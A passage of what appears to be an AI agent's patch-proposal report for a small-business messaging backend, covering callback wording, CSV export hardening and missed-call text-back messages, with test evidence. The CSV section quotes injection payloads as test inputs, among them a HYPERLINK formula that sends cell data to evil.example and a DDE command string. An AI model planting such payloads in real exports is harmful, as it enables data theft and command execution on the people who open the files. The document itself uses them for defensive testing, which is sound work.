- **The WeakMap depends on object identity.** The note is attached to the exact object that `bookVisit`, `flagLead`, `rescheduleVisit` or `cancelRequest` returns. A future caller that clones the record before calling `deliveryNote` gets the "not confirmed" wording. That is fail-safe.
- **A thrown provider call still propagates.** If the provider POST throws (a network error rather than an HTTP error), `notifyOwner` throws after the record is saved, just as at base. `runAgent` then gives the model its existing "outcome is unconfirmed" text (`lib/agent.mjs:10`). I did not change that path.
- **Twilio acceptance is not delivery.** The wording says so. Delivery receipts (status callbacks) are not read anywhere for legacy tenants.

---

## Proposal 5: no timed callback promise in legacy prompts

Source: review finding R3. This was easy and isolated: two files and prompt wording only.

### Problem
- `lib/config.mjs:255` builds the legacy callback phrase: "say Ray will call them within 30 minutes", "… when the shop opens at 7 am this morning" or "… by 8 am tomorrow". It uses `rules.callbackHours` and `callbackAfterHours`, which `newClient` (`config.mjs:172`) and `client.mjs:269-270` fill with those defaults for every shop.
- `config.mjs:288` adds "Never say 'someone will call you back' without the window."
- `lib/vapi.mjs:50-54` repeats the timed promise in both voice branches.
- Nothing guarantees the call. `trackCallback` and the overdue note (`lib/desk.mjs:366-386`) only remind the owner.

### Change (`05-callback-promise.patch`)
- **`config.mjs:255`, legacy branch.** The phrase is now "Ray will get their details and follow up", plus "(the shop is closed and opens at 7 am this morning)" or "(the shop is closed right now)" when the shop is closed. The self-service (v1) phrase is untouched.
- **`config.mjs:288`.** The rule is now "Never promise a callback time or say someone will call within a set time."
- **`lib/vapi.mjs:50-54`.** Both voice branches say "Ray will get their details and follow up", with the same rule. The now-unused `window` and `r` locals are removed.
- **Unchanged on purpose:** `rules.callbackHours` and `callbackAfterHours` still drive the owner-side overdue tracking (`desk.mjs:340-386`). The portal setting still exists; it just no longer reaches customers through the prompt.

### Evidence
`callback-promise-check.mjs` assembles the real prompts:
- `buildSystemPrompt` on the web, SMS and test channels, with the shop open, closed, and opening later today;
- `voicePrompt`, plain and with transfer-all;
- for a legacy shop on default rules and for one with owner-typed values ("within 15 minutes", "first thing tomorrow").

It asserts that no timed phrase remains and that the handoff line says "Ray will get their details and follow up" and "Never promise a callback time". It also asserts that the v1 wording is unchanged.

| Copy | Result | Receipt |
|---|---|---|
| Base | **FAIL, 22 of 23.** Only the v1 row passes. | `receipts/callback-promise-base.{log,json}` |
| `05` alone | **PASS, 23 of 23** | `receipts/callback-promise-patched.{log,json}` |
| All five patches | **PASS, 23 of 23** | `receipts/callback-promise-all-five.{log,json}` |
| All seven patches | **PASS, 23 of 23** | `receipts/callback-promise-all-seven.{log,json}` |

### Risks and decisions for the owner
- **This is a product decision** (R3 names the owner). Shops that deliberately configured a callback promise lose it in the customer conversation. The alternative is to keep it only when the owner has explicitly accepted it as a service-level promise. That needs a new "accepted" flag, because the stored default cannot be told apart from an owner-typed value.
- **Not changed (other places the promise still reaches customers or local tests):**
  - `lib/desk.mjs:574-576` texts the customer "`<owner>` will call you `<callbackHours>`" (template `fallback_window`, `desk.mjs:85`, `:90`) when the owner has **not** acknowledged an alert. That is a timed promise made exactly when the owner is unresponsive, and it should get the same rewording.
  - `lib/fake-model.mjs:27` still falls back to "within 30 minutes" when the prompt has no "will call them" phrase. This is test-only output, but local fake-model transcripts will keep showing the old promise.
  - `lib/rubric-eval.mjs:11`, `:74` and `:84` contain the old promise in sample rubric dialogues.

---

---

## Proposal 6: owner CSV downloads neutralise spreadsheet formulas (security)

Source: coverage-map blind spot D1 (`/tmp/mc-claude-coverage-map-20261110/qa-artifacts/claude-collaboration/blind-spot-checks/account-actions-ui-check.mjs`).

### Problem
- `netlify/functions/client.mjs:585` (`csvCell`, used by `csv()` at `:586`) quotes cells but does not neutralise formulas. The owner's bookings, leads, customers and conversations downloads (`exportCSV`, `:592-646`) therefore carry customer-typed text verbatim, and customers control most of those fields. A name, issue or message such as `=HYPERLINK("https://evil.example/?x="&A1,"Click")`, `@SUM(1+1)`, `-2+3` or ` =cmd|' /C calc'!A0` runs as a formula when the owner opens the file in Excel, Numbers or Sheets. This is OWASP "CSV Injection": data exfiltration through links, and DDE command execution on older Excel.
- `lib/intake.mjs:135-138` already guards its own export: a cell matching `/^\s*[=+\-@]/` or `/^[\t\r]/` gets a leading apostrophe.

### Change (`06-csv-formula-guard.patch`)
- **New `lib/spreadsheet-cell.mjs`** with `formulaSafe(text)`. It uses the **same trigger rule as intake**: `= + - @` after optional whitespace, or a leading tab or CR, gets an apostrophe prefix.
  - **One deliberate exception:** a plain signed number, `/^[+-]?\d+(\.\d+)?$/`, is left as is. That covers E.164 phones such as `+17135550123`, and values like `-5` or `12.50`. Such a value has no operator, reference or function after the sign, so it cannot execute or exfiltrate anything.
  - The phone columns stay usable for the Jobber and Housecall Pro import that the customers export is built for (`client.mjs:629`). With the plain intake rule, every phone would become `'+17135550123`.
- **`client.mjs`:** `csvCell` runs the text through `formulaSafe` before quoting. One import line is added.
- **`lib/intake.mjs` is unchanged.** Its rule is identical apart from the number exception. Its export has no phone column today, and it could adopt the shared helper later.

### Why an apostrophe prefix
- It is the accepted practice (OWASP), and intake already uses it, so owners see one convention.
- The value stays readable and searchable.
- Alternatives:
  - a leading space or tab: Excel can still evaluate a cell with a leading space;
  - stripping the characters: this loses data such as "-2+3" or "@home";
  - a "safe" format such as XLSX: a much larger change.

### Evidence
`csv-injection-check.mjs` saves records through the real `bookVisit`, `flagLead` and `saveConversation`, calls the **real `client.mjs` handler** (`GET ?c=&k=&export=bookings|leads|customers|conversations`, legacy owner key), and parses each CSV. Hostile values:
- `=HYPERLINK(…)`, `@SUM(1+1)`, `-2+3`, ` =cmd|…`, `+cmd|…`;
- tab and CR prefixes (in conversation messages, which are stored verbatim; `desk.mjs:39` trims booking and lead fields);
- the normal phone `+17135550123`.

The check asserts three things: every hostile value is exported with the apostrophe; no cell still starts like a formula; and the phone is exported unchanged.

| Copy | Result | Receipt |
|---|---|---|
| Base | **FAIL, 4 of 4 exports.** 21 live formula cells across bookings (5), leads (5), customers (6) and conversations (5). | `receipts/csv-injection-base.{log,json}` |
| `06` alone | **PASS, 4 of 4.** The phone is unchanged. | `receipts/csv-injection-patched.{log,json}` |
| All seven | **PASS** | `receipts/csv-injection-all-seven.{log,json}` |

The D1 browser check from the coverage map was not rerun. It drives the account page download UI. The handler-level check above covers the server output it depends on.

### Risks
- **Visible apostrophes.** Cells that legitimately start with `-` or `+` followed by text (for example "- left voicemail" in notes) now show a leading apostrophe in a spreadsheet. That is the standard trade-off.
- **The number exception is policy.** Widening it, for example to allow spaces or parentheses in phones, must not admit operators.

---

## Proposal 7: missed-call text-back promises only a text that was sent

Source: coverage-map blind spots D2 and D3 (`/tmp/mc-claude-coverage-map-20261110/qa-artifacts/claude-collaboration/blind-spot-checks/missed-call-textback-check.mjs`; base evidence `evidence/claude-blind-missed-call-textback-dfb0ae78.json`).

### Problem
- **D2.** `netlify/functions/voice.mjs:85-87` builds the spoken line "We are texting you this second so we can get you scheduled." (in Spanish, "Le enviamos un mensaje de texto ahora mismo") **before** deciding whether to text. `:108` always plays it. The caller hears the promise when:
  - they opted out;
  - text-back is off;
  - they were texted in the last 24 hours;
  - the provider refused the text;
  - texting is not set up.
- **D3.** The owner note at `:106` says "No texting sender yet, so no text-back." for **every** failed send, including a provider refusal when a sender exists. It also says "Text-back sent" when the send was only logged because texting is not configured (`r.logged`).

### Change (`07-missed-call-promise.patch`, one file)
- **The spoken line is chosen after the send.**
  - The existing promise (English and Spanish) is spoken only when `sendSMS` returned `ok` (the provider accepted it).
  - In every other case the caller hears "Please call back or send a text to this number, and we will get you scheduled." (in Spanish, "Por favor vuelva a llamar o envíenos un mensaje de texto a este número."). This promises nothing.
  - Twilio reads the TwiML only after the handler returns, so choosing the line after the send adds no delay for the caller.
- **The owner note gives the real reason:**

  | Outcome | Owner note |
  |---|---|
  | Sent | "Text-back sent; …" |
  | Logged | "Texting is not set up yet, so no text-back was sent. Please call them back." |
  | Failed | "The text-back could not be sent (`<provider message>`). Please call them back." |
  | Opted out | "They opted out, so no text-back. …" (wording kept compatible with the reference check) |
  | Recent | "They were already sent a text-back in the last 24 hours, so no new one." |
  | Text-back off | "Text-back is off for this line, …" |
  | No caller ID | "No caller ID, …" |

- **Unchanged:**
  - the send logic and 24-hour rule;
  - the events (`text_back_skipped`, `missed_call.textBack`);
  - the saved conversation message;
  - the TwiML shape (`<Say>…<Hangup/>`).

### Evidence
`missed-call-promise-check.mjs` is built on the reference check. It uses the real `/api/voice` handler with a signed webhook, the real send path, synthetic Twilio values and an in-process fake Messages API, and no network. Cases:
- a new caller (promise kept), in English and Spanish;
- an opted-out caller, in English and Spanish;
- text-back off;
- a caller texted in the last 24 hours;
- a provider refusal (owner reason checked);
- texting not configured, run in a child process with no Twilio env, so the send is only logged;
- no transport.

| Copy | Result | Receipt |
|---|---|---|
| Base | **FAIL, 6 of 10.** The promise is spoken in all five no-text cases, and the owner gets "No texting sender yet" after a provider refusal. | `receipts/missed-call-promise-base.{log,json}` |
| `07` alone | **PASS, 10 of 10** | `receipts/missed-call-promise-patched.{log,json}` |
| All seven | **PASS** | `receipts/missed-call-promise-all-seven.{log,json}` |

The **reference check itself**, copied unmodified into the throwaway copies, gives these results:
- base: 7 of 9 passing, failing D2 and D3 (its own evidence file);
- `07` alone: **9 of 9**;
- all seven: **9 of 9**.

Receipts: `receipts/ref-missed-call-textback-{p07,all}.log`.

### Risks
- **Callers hear the promise less often.** They now hear it only when Twilio accepted the text. With texting not set up (dev or test shops), no caller hears it.
- **The provider error goes to the owner.** The note includes Twilio's error message (up to 120 characters). It goes only to the owner's own phone or email.
- **Not changed:** a "logged" send (no texting configured) is still saved as a missed-call text-back in the conversation (`voice.mjs:97-100`). A real call within 24 hours is therefore treated as "recent" and gets no text-back. That only matters for shops without texting, where nothing can be sent anyway.

---

## Regressions for proposals 3 to 7

### Method
- **Which scripts.** The candidates were every `scripts/*.mjs` file that references `chat.mjs`, `sms-agent-background.mjs`, `sms.mjs`, `vapi.mjs`, `voice.mjs`, `lib/config.mjs`, `lib/desk.mjs`, `lib/send.mjs`, `lib/vapi.mjs`, or `/api/chat|vapi|sms|voice`. That is 126 files. 117 were run. These 9 were not:
  - `sales-desk-eval*`, `sales-positioning-eval`: real-model evals;
  - `stripe-test-lifecycle-proof`: needs a live provider;
  - `calendar-test-fixtures`, `support-report-fixtures`, `pricing-model`, `hosted-onboarding-guard.mjs`: helpers, not checks.

  The lists are in `receipts/p345-regress-scripts-run.txt` (74 non-browser scripts) and `receipts/p345-regress-scripts-not-run-browser.txt` (43 browser scripts, which were in fact run; see below).
- **How each script ran.** From the copy root, under `env -i` (PATH and HOME only), with a 300 s alarm. The egress preload `receipts/p345-block-egress.mjs` refused every non-loopback connection. Each script got a fresh `--output scratchpad/<name>-bp2rg.json`, or a positional path for the four scripts that read `argv[2]`. Browser scripts also got `--playwright` pointing at the installed npx Playwright, using the bundled chromium-1223. Runners: `receipts/p345-regress-runner.sh` and `receipts/p345-regress-runner-browser.sh`.
- **What counted as "the same as base".** For each script: the same exit code, and the same multiset of verdict tokens in its log (`"pass":true/false`, `passed`/`failed` counts, `ok`/`PASS`/`FAIL` lines). The only remaining log differences are timestamps, source hashes of the patched files, random refs, and `smoke`'s module count (137 vs 138; `01` adds a module).

### Results

| Copy | Non-browser (74) | Browser (43) | Same as base? |
|---|---|---|---|
| Base dfb0ae78 | 68 pass, 6 fail | 17 pass, 26 fail | n/a |
| `03`, `04`, `05`, `06`, `07`, each alone | 68 / 6 | not run alone | **yes**, 0 exit-code and 0 verdict differences |
| `01`+`02`+`03`+`04`+`05` | 68 / 6 | not run | **yes** |
| All seven | 68 / 6 | 17 / 26 | **yes**, browser included |

Receipts:
- `receipts/p345-regress-{base,p03,p04,p05,all-five}/`
- `receipts/p67-regress-{p06,p07}/`
- `receipts/regress-all-seven/`
- `receipts/regress-browser-{base,all-seven}/`

Each folder has one log per script and a `SUMMARY.tsv`.

The acceptance checks for proposals 1 and 2 also pass on the all-seven copy:
- `stop-keywords-check`: 0 of 159 required cases failing;
- `chat-403-check`: 28 of 28.

Receipts: `receipts/{stop-keywords,chat-403}-all-seven.*`.

### Voice and export scripts (asked for 06 and 07)
These all exit 0 on base, `06`, `07` and all seven:
- `smoke` (it runs the missed-call path; on `07` its owner line now reads "Texting is not set up yet, so no text-back was sent", where base said "Text-back sent" for a send that was only logged);
- `voice-activation-check`, `voice-delivery-independent-check`, `managed-voice-handoff-check`;
- `account-setup-check`, `customer-account-qa-check` (exports);
- `conversation-history-check`, `workspace-activity-check`, `website-installation-check`;
- `conversation-history-ui-check`, `request-automation-ui-check`, `request-followthrough-ui-check`, `platform-sms-check` (browser runs on base and all seven).

### Pre-existing failures (identical on every copy; not caused by any patch)
- **Non-browser:**
  - `availability-check`: 401 where it expects 403;
  - `availability-model-check`: needs `--ledger` and a guarded server;
  - `capacity-check`: expects a Blobs error text;
  - `lead-sources-independent-check`: a recovery count assertion;
  - `phone-activation-qa-check`: exit 13, fatal in its suite;
  - `readiness-email-admission-qa-check`: needs a `.git` checkout, which the copies do not have.
- **Browser:** 26 scripts, each of which needs a guarded or real-model server, a pinned historical source hash, extra fixtures, or a server URL:
  - account-page-ui-qa, appointment-texts-ui, availability-session-ui, availability-ui, complete-connections-ui-qa, connection-journey-ui, customer-budget-ui, customer-journey;
  - demo-outcome, demo-outcome-model, experience-tours, experience-ui, hosted-onboarding-guard, launch-google-disclosure-qa, launch-po-followthrough, lead-ai-independent;
  - lead-sources-independent-ui, portal-revamp-ui-qa, sales-desk-baseline, sales-desk-render-repair, service-connections-ui, site-demo, site-demo-model, website-concurrency-ui;
  - widget-setup-refresh, widget-stream (stale per REFRESH.md).

---

## Not applied
All seven patches are proposals for the backend owner (Codex). The worktree's tracked files are unchanged at dfb0ae78. Nothing was committed or pushed. The scratch copies were deleted after the runs (rounds 3 and 4: `bp2-copy/`).

